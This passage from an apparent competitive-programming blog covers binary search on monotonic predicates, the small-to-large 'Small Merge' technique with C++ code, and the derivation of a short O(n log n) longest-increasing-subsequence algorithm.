class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-r"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord textrm">and</span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>

<!-- TODO monotonicity graph -->

<p>In competitive programming, there are often situations where we have a monotonic predicate and we want to find the lowest integer where it is true. For example:</p>

<ul>
  <li><a href="https://orac.amt.edu.au/cgi-bin/train/problem.pl?set=aio15int&amp;problemid=853">AIO2015 - Wet Chairs</a></li>
  <li><a href="https://ioi2010.org/Tasks/Day1/Quality_of_Living.shtml">IOI2010 - Quality of Living</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Widest_path_problem">Widest path problem</a></li>
</ul>

<p>In fact, whenever you want to “minimise the maximum” (or “maximise the minimum”) of some quantity, binary search is almost always the answer.</p>

<h2 id="extra-early-exit"><a href="#extra-early-exit">Extra: Early Exit</a></h2>

<p>Binary search implementations commonly “early exit”, returning the index if the midpoint matches the element you want to find. However, this rarely is useful:</p>

<ul>
  <li>It has no effect on time complexity, and doesn’t even get run most of the time.</li>
  <li>If you actually want the first/last element that’s equal, the algorithm won’t work.</li>
  <li>It’s still another source of bugs, particularly if you’re using “the loop terminated” to mean that the element wasn’t found.</li>
</ul>

<h2 id="extra-preconditions--postcondition"><a href="#extra-preconditions--postcondition">Extra: Preconditions &amp; Postcondition</a></h2>

<p>There are another kind of invariant: preconditions and postconditions on functions. Instead of describing features of a loop, they are correspondingly guarantees before and after the function. Preconditions sometimes are requirement about the arguments (e.g. a pointer is not null), while postconditions can be guarantees about the return value (e.g. the function returns the maximum value in the array).</p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>The “standard” binary search of finding an element in a sorted array has <a href="https://stackoverflow.com/q/504335/6936976">many edge cases that you need to consider &amp; specify</a>: How do we handle duplicate elements? What if the value is missing? What if the array is empty? and so on. The “lower bound” binary search is much simpler to reason about and avoids all of these edge cases. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>i.e. the <a href="https://en.cppreference.com/w/cpp/algorithm/lower_bound">lower_bound</a> function from the C++ standard library <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>For an explanation of why <code class="language-plaintext highlighter-rouge">lo + (hi - lo) / 2</code> instead of the simpler <code class="language-plaintext highlighter-rouge">(lo + hi) / 2</code>, see <a href="https://ai.googleblog.com/2006/06/extra-extra-read-all-about-it-nearly.html">Nearly All Binary Searches and Mergesorts are Broken</a>. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/small-merge">Small Merge</a></h2>
  
    <div class="bounded"><p>Small merge is a technique derived from DSU which allows merging of groups (and data about groups) by moving elements between groups at most O(n log n) times.</p>

<!--more-->

<p>tl;dr: When merging collections of objects, only move from smaller group to larger group. This is O(n log n).</p>

<p>This was originally explained to me as a variation of union find: what if we directly update the parent pointer when we merge two sets? To do this, we’ll need to be able to iterate over all nodes in a set, and we can store this in a vector. Then, when we merge, we only change the parent pointers of elements in the smaller set. In code, it’s something like this:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">root</span><span class="p">[</span><span class="n">N</span><span class="p">];</span> <span class="c1">// initially, root[i] = i</span>
<span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">contents</span><span class="p">[</span><span class="n">N</span><span class="p">];</span> <span class="c1">// initially, contents[i] = {i}</span>

<span class="kt">void</span> <span class="nf">merge</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">a</span> <span class="o">=</span> <span class="n">root</span><span class="p">[</span><span class="n">a</span><span class="p">];</span> <span class="n">b</span> <span class="o">=</span> <span class="n">root</span><span class="p">[</span><span class="n">b</span><span class="p">];</span>
	<span class="k">if</span><span class="p">(</span><span class="n">contents</span><span class="p">[</span><span class="n">a</span><span class="p">].</span><span class="n">size</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">contents</span><span class="p">[</span><span class="n">b</span><span class="p">].</span><span class="n">size</span><span class="p">())</span> <span class="n">swap</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span> <span class="c1">// ensure a's group is larger</span>
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">:</span> <span class="n">contents</span><span class="p">[</span><span class="n">b</span><span class="p">])</span> <span class="p">{</span>
		<span class="n">parent</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">;</span>
		<span class="n">contents</span><span class="p">[</span><span class="n">a</span><span class="p">].</span><span class="n">emplace_back</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">contents</span><span class="p">[</span><span class="n">b</span><span class="p">].</span><span class="n">clear</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>By observing how a single value moves between sets, we can see that the number of moves is log of the size of set its in – when a number moves, the set must at least double in size. Thus, the overall complexity in terms of total number of moves is in fact <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>.</p>

<h2 id="generalising-this-idea"><a href="#generalising-this-idea">Generalising this idea</a></h2>

<p>We can take the idea of only merging smaller into larger, and generalise it, such as by storing more useful information. Suppose we have the following problem:</p>

<blockquote>
  <p>There are N integers, initially in separate groups. We want to support the following operations:</p>

  <ul>
    <li>Merge two groups into one.</li>
    <li>Answer query: How many elements in a certain group have a certain value?</li>
  </ul>
</blockquote>

<p>To answer the second operation, we keep a map of the number of each value instead of just the contents, and use normal DSU. When merging, we merge from the group whose map is smaller into the one whose map is larger, thus being able solve the problem in <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><msup><mo><mi>log</mi><mo>&#x2061;</mo></mo><mn>2</mn></msup><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \log^2 n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.148448em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8984479999999999em;"><span style="top:-3.1473400000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> with each query being <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>.</p>

<p>In particular, this technique is much more useful on trees, where we can entire remove the DSU required to find the root. <a href="https://www.hackerrank.com/contests/101feb14/challenges/coloring-tree">HackerRank - Coloring Tree</a> is a good problem to demonstrate this:</p>

<blockquote>
  <p>There is a rooted tree of size N, where each node has a value associated. We want to answer Q queries offline, each asking for the number of distinct values in a given subtree.</p>
</blockquote>

<p>To do this, we keep a set for each node containing all values in the subtree. Then, we answer queries starting from the leaves, merging children subtrees into parents as needed. However, this lends itself more to a recursive algorithm. In pseudocode:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>// solve queries at node
// returns the set of all value in its subtree
solve(node):
	values = set()
	for v in node's children:
		s = solve(v)
		values = merge(values, s) // small merge here
	add node's value to values
	answer queries at node
	return values
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And that’s the general shape of Small Merge algorithms! If you can keep data that’s at most the size of the group, you can small merge.</p>

<p>If you want to read more, there’s <a href="https://cp-algorithms.com/data_structures/disjoint_set_union.html#toc-tgt-15">a section on cp-algorithms</a>.</p>

<h2 id="practice-problems"><a href="#practice-problems">Practice Problems</a></h2>

<p>I couldn’t find many problems which use this technique. If you know of any, please let me know in the comments below!</p>

<ul>
  <li><a href="https://www.hackerrank.com/contests/101feb14/challenges/coloring-tree">HackerRank - Coloring Tree</a></li>
  <li><a href="http://usaco.org/index.php?page=viewproblem2&amp;cpid=286">USACO Gold - Ying and Yang</a></li>
  <li><a href="https://codeforces.com/contest/1193/problem/B">Codeforces - Magic Tree</a></li>
</ul>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/alberts-lis">Short and simple LIS</a></h2>
  
    <div class="bounded"><p>The <a href="https://en.wikipedia.org/wiki/Longest_increasing_subsequence">Longest Increasing Subsequence problem</a> is a “standard” problem in informatics, and it is sometimes used as an introduction to more advanced DPs. While the naive DP algorithm runs in <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>, this can be optimised to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> using a variety of data structures and algorithms.</p>

<!--more-->

<p>Here’s the algorithm:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="kt">size_t</span> <span class="nf">lis</span><span class="p">(</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="k">const</span><span class="o">&amp;</span> <span class="n">nums</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">set</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">s</span><span class="p">;</span>
	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">:</span> <span class="n">nums</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">auto</span> <span class="n">at</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">lower_bound</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="n">at</span> <span class="o">!=</span> <span class="n">s</span><span class="p">.</span><span class="n">end</span><span class="p">())</span> <span class="n">s</span><span class="p">.</span><span class="n">erase</span><span class="p">(</span><span class="n">at</span><span class="p">);</span>
		<span class="n">s</span><span class="p">.</span><span class="n">emplace</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">size</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="deriving-this-algorithm"><a href="#deriving-this-algorithm">Deriving this algorithm</a></h2>

<p>Despite not looking like a DP, it is in fact based on one: Let <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp(n, h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span> equal the length of the LIS using numbers no greater than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span> from <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mn>1..</mn><mi>n</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A[1..n]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord">1</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">n</span><span class="mclose">]</span></span></span></span>. Thus, we derive the recurrence</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>h</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">(</mo><mi>n</mi><mo>&#x2212;</mo><mn>1</mn><mo separator="true">,</mo><mi>h</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>h</mi><mo>&lt;</mo><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>max</mi><mo>&#x2061;</mo><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mo stretchy="false">(</mo><mi>n</mi><mo>&#x2212;</mo><mn>1</mn><mo separator="true">,</mo><mi>h</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>d</mi><mi>p</mi><mo stretchy="false">(</mo><mi>n</mi><mo>&#x2212;</mo><mn>1</mn><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>h</mi><mo>&#x2265;</mo><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">dp(n,h) = \begin{cases}
dp(n-1,h) &amp; h &lt; A[n] \\
\max(dp(n-1,h), dp(n-1, A[n]-1)+1) &amp; h \ge A[n]
\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mop">max</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>

<p>From this we can see to calculate <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mo>&#x22c5;</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp(n, \cdot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">&#x22c5;</span><span class="mclose">)</span></span></span></span>, we only need the values of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">(</mo><mi>n</mi><mo>&#x2212;</mo><mn>1</mn><mo separator="true">,</mo><mo>&#x22c5;</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp(n-1, \cdot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">&#x22c5;</span><span class="mclose">)</span></span></span></span>. As such, we can memory optimise the DP to performing the mapping</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>&#x21a6;</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>h</mi><mo>&#x2265;</mo><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>&#x2227;</mo><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>=</mo><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>otherwise</mtext></mstyle></mtd></mtr></mtable></mrow><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">lis(h) \mapsto \begin{cases}
lis(A[n] - 1) + 1 &amp; h \ge A[n] \wedge lis(h) = lis(A[n] - 1) \\
lis(h) &amp; \text{otherwise}
\end{cases}.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↦</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">otherwise</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span></span></span></span></span></p>

